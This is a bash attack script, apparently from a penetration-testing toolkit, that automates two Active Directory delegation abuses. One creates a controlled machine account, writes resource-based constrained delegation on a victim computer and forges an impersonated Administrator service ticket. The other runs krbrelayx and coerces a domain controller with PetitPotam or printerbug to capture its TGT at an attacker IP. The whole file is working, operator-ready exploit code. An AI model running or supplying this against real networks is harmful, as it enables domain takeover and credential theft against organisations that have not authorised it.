#!/usr/bin/env bash
# =============================================================================
#  delegation_abuse.sh  —  RBCD and unconstrained-delegation abuse  (ATOMIC)
# =============================================================================
#  Attack-chain role: two distinct delegation attacks, selected with -m.
#
#  -m rbcd   (Resource-Based Constrained Delegation)
#     Needs a credential that can create a computer (default MAQ) or edit the
#     victim's msDS-AllowedToActOnBehalfOfOtherIdentity. Steps:
#       1. addcomputer   — create a controlled machine account
#       2. rbcd write    — allow it to delegate to the victim computer
#       3. getST         — S4U2Self+S4U2Proxy to impersonate a user to the victim
#     Produces a service ticket (.ccache) for immediate use.
#       flags: --computer NAME$ --computer-pass PW --delegate-to VICTIM$
#              --impersonate USER --spn cifs/victim.fqdn
#
#  -m unconstrained   (coerce + capture)
#     Assumes you control a host/account WITH unconstrained delegation. Runs
#     krbrelayx to catch the forwarded TGT, then coerces the DC to authenticate
#     to you (PetitPotam or printerbug). The DC's TGT lands as a .ccache.
#       flags: --attacker-ip IP [--coerce-target DC] [--method petitpotam|printerbug]
#              (krbrelayx needs the delegation account's key: uses the selected
#               NTLM/AES credential automatically)
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

KRBRELAYX="${KRBRELAYX:-$HOME/tools/krbrelayx}"
PETITPOTAM="${PETITPOTAM:-$HOME/tools/PetitPotam}"

usage() { cat <<'EOF'
delegation_abuse.sh — RBCD and unconstrained-delegation abuse (ATOMIC)

USAGE:   ./delegation_abuse.sh -m <rbcd|unconstrained> [opts]

-m rbcd   create a controlled computer, write RBCD on the victim, S4U a ticket:
  --computer <NAME$>       machine account to create (default CPTC$)
  --computer-pass <pw>     its password (generated if omitted)
  --delegate-to <VICTIM$>  computer to take over (required)
  --impersonate <user>     user to impersonate (default Administrator)
  --spn <spn>              target SPN (default cifs/<victim>.<domain>)

-m unconstrained   krbrelayx capture + coercion of the DC:
  --attacker-ip <ip>       your IP the DC authenticates to (required)
  --coerce-target <dc>     DC to coerce (default: --target)
  --method <m>             petitpotam (default) | printerbug

  -h, --help               this help
  (shared flags -t/-d/--dc-ip: --help-common)

EXAMPLE: ./delegation_abuse.sh -m rbcd --delegate-to WS01$ --impersonate Administrator
PREREQS: a credential in creds.json (NTLM/AES preferred for unconstrained);
  rbcd needs MAQ>0 or RBCD-write; unconstrained needs ~/tools/krbrelayx + PetitPotam.
EOF
}

MODE=""
COMPUTER="CPTC\$" COMPUTER_PASS="" DELEGATE_TO="" IMPERSONATE="Administrator" SPN=""
ATTACKER_IP="" COERCE_TARGET="" COERCE_METHOD="petitpotam"

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -m|--mode) MODE="$2"; shift 2 ;;
    --computer) COMPUTER="$2"; shift 2 ;;
    --computer-pass) COMPUTER_PASS="$2"; shift 2 ;;
    --delegate-to) DELEGATE_TO="$2"; shift 2 ;;
    --impersonate) IMPERSONATE="$2"; shift 2 ;;
    --spn) SPN="$2"; shift 2 ;;
    --attacker-ip) ATTACKER_IP="$2"; shift 2 ;;
    --coerce-target) COERCE_TARGET="$2"; shift 2 ;;
    --method) COERCE_METHOD="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
[[ -n "$MODE"   ]] || die "choose -m rbcd | unconstrained"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"

# Track any CLI-supplied machine-account password BEFORE the first log write
# (log_begin records the arg string) so it is redacted even in the run header.
[[ -n "$COMPUTER_PASS" ]] && secret_track "$COMPUTER_PASS"

log_begin

case "$MODE" in
  # ------------------------------------------------------------------ RBCD
  rbcd)
    [[ -n "$DELEGATE_TO" ]] || die "rbcd needs --delegate-to <VICTIM\$> (the computer you want to take over)"
    COMPUTER_PASS="${COMPUTER_PASS:-Cptc!$(date +%s)Aa}"
    SPN="${SPN:-cifs/${DELEGATE_TO%$}.${DOMAIN}}"
    secret_track "$COMPUTER_PASS"
    log_info "RBCD: create ${COMPUTER}, delegate to ${DELEGATE_TO}, impersonate ${IMPERSONATE}"

    # 1) create a machine account we control
    need_cmd impacket-addcomputer
    run_cmd "impacket-addcomputer -computer-name $(printf '%q' "$COMPUTER") -computer-pass $(printf '%q' "$COMPUTER_PASS") -dc-ip ${DC} $(imp_target) $(imp_secret_flags)"
    if [[ "$LAST_RC" -eq 0 ]]; then
      creds_add "$DOMAIN" "$COMPUTER" "password" "$COMPUTER_PASS" "RBCD machine account, $(date '+%F')"
    else
      log_warn "addcomputer failed — MAQ may be 0 or account exists; continuing in case you edit RBCD directly"
    fi

    # 2) write msDS-AllowedToActOnBehalfOfOtherIdentity on the victim
    need_cmd impacket-rbcd
    run_cmd "impacket-rbcd -delegate-from $(printf '%q' "$COMPUTER") -delegate-to $(printf '%q' "$DELEGATE_TO") -action write -dc-ip ${DC} $(imp_target) $(imp_secret_flags)"
    [[ "$LAST_RC" -eq 0 ]] || log_warn "rbcd write failed (need write over ${DELEGATE_TO})"

    # 3) S4U: get a service ticket impersonating a privileged user to the victim
    need_cmd impacket-getST
    CCACHE="${RUN_DIR}/${IMPERSONATE}@${DELEGATE_TO%$}.ccache"
    run_cmd "cd '${RUN_DIR}' && KRB5CCNAME='${CCACHE}' impacket-getST -spn $(printf '%q' "$SPN") -impersonate $(printf '%q' "$IMPERSONATE") -dc-ip ${DC} $(printf '%q' "${DOMAIN}/${COMPUTER}"):$(printf '%q' "$COMPUTER_PASS")"
    if [[ "$LAST_RC" -eq 0 ]]; then
      log_ok "service ticket obtained. Use it with:  export KRB5CCNAME='${CCACHE}'  then e.g. impacket-wmiexec -k -no-pass ${DELEGATE_TO%$}.${DOMAIN}"
    else
      log_err "getST failed — check the SPN (${SPN}) and that RBCD write succeeded"
    fi
    ;;

  # -------------------------------------------------------- UNCONSTRAINED
  unconstrained)
    [[ -n "$ATTACKER_IP" ]] || die "unconstrained needs --attacker-ip <your IP the DC will auth to>"
    COERCE_TARGET="${COERCE_TARGET:-$TARGET}"
    [[ -d "$KRBRELAYX" ]] || die "krbrelayx not found at ${KRBRELAYX} (set \$KRBRELAYX)"
    log_info "unconstrained: capture with krbrelayx, coerce ${COERCE_TARGET} via ${COERCE_METHOD}"
    log_warn "assumes you control a host/account WITH unconstrained delegation; krbrelayx uses the selected credential's key to decrypt"

    # krbrelayx needs the delegation account's secret to decrypt the forwarded
    # TGT. Map the selected credential to its flag.
    case "$SEL_STYPE" in
      ntlm_hash) KR_KEY="-hashes :$(printf '%q' "$SEL_SECRET")" ;;
      aes_key)   KR_KEY="-aesKey $(printf '%q' "$SEL_SECRET")" ;;
      *)         KR_KEY=""; log_warn "a password cannot decrypt the TGT directly — supply the account's NTLM/AES in creds.json for best results" ;;
    esac

    # 1) start krbrelayx in TGT-capture mode (background); it drops <user>.ccache
    KR_LOG="${RUN_DIR}/krbrelayx.log"
    KR_CMD="cd '${RUN_DIR}' && python3 '${KRBRELAYX}/krbrelayx.py' ${KR_KEY} -ip ${ATTACKER_IP}"
    log_run "$KR_CMD"
    bash -c "$KR_CMD" >"$KR_LOG" 2>&1 &
    KR_PID=$!
    master_raw "  [bg] krbrelayx started pid=${KR_PID}, log=${KR_LOG}"
    sleep 2

    # 2) coerce the DC to authenticate to us. printerbug.py takes
    #    "DOMAIN/user[:pass]@COERCE_TARGET [-hashes :NT] ATTACKER_IP".
    if [[ "$COERCE_METHOD" == "printerbug" ]]; then
      need_cmd python3
      if [[ "$SEL_STYPE" == "password" ]]; then
        COERCE_ID="$(printf '%q' "${DOMAIN}/${SEL_USER}"):$(printf '%q' "$SEL_SECRET")@${COERCE_TARGET}"; COERCE_SECRET=""
      else
        COERCE_ID="$(printf '%q' "${DOMAIN}/${SEL_USER}")@${COERCE_TARGET}"; COERCE_SECRET="-hashes :$(printf '%q' "$SEL_SECRET")"
      fi
      run_cmd "python3 '${KRBRELAYX}/printerbug.py' ${COERCE_ID} ${COERCE_SECRET} ${ATTACKER_IP}" || log_warn "printerbug coercion returned non-zero"
    else
      [[ -d "$PETITPOTAM" ]] || log_warn "PetitPotam not found at ${PETITPOTAM} (set \$PETITPOTAM)"
      run_cmd "python3 '${PETITPOTAM}/PetitPotam.py' -u $(printf '%q' "$SEL_USER") $([[ "$SEL_STYPE" == password ]] && printf -- '-p %q' "$SEL_SECRET" || printf -- '-hashes :%q' "$SEL_SECRET") -d $(printf '%q' "$DOMAIN") ${ATTACKER_IP} ${COERCE_TARGET}" || log_warn "PetitPotam coercion returned non-zero"
    fi

    # 3) give krbrelayx a moment to receive, then stop it and report
    sleep 3
    kill "$KR_PID" 2>/dev/null
    wait "$KR_PID" 2>/dev/null
    LAST_RAW_FILE="$KR_LOG"; LAST_RC=0; LAST_OUTPUT="$(cat "$KR_LOG" 2>/dev/null)"
    log_output
    if ls "${RUN_DIR}"/*.ccache >/dev/null 2>&1; then
      log_ok "captured ticket(s): $(ls "${RUN_DIR}"/*.ccache | tr '\n' ' ')  — export KRB5CCNAME and use with -k -no-pass"
    else
      log_warn "no .ccache captured — check ${KR_LOG}; coercion/relay often needs DNS + the right SPN/host context"
    fi
    ;;

  *) die "unknown mode: ${MODE}" ;;
esac

log_end "success"
